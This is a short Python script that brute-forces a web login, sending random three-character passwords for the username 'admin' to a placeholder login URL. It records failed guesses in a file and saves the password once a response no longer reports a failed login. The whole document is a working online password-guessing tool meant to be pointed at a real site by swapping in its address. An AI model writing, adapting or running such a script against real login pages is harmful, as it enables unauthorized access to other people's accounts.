import requests
import random

url = 'https://example.com/login'  # Replace with actual URL
username = 'admin'
chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#"

def send_request(username, password):
    data = {
        'username': username,
        'password': password,
    }
    response = requests.get(url, params=data)  # or use post if required
    return response

def main():
    while True:
        valid = False
        while not valid:
            passwd = ''.join(random.choices(chars, k=3))
            with open("tries.txt", "r") as file:
                tries = file.read()
            if passwd not in tries:
                valid = True

        r = send_request(username, passwd)

        if 'failed to login' in r.text.lower():
            with open("tries.txt", "a") as f:
                f.write(f"{passwd}\n")
            print(f"Incorrect: {passwd}")
        else:
            print(f"Success! Password is: {passwd}")
            with open("corrects.txt", "w") as f:
                f.write(passwd)
            break
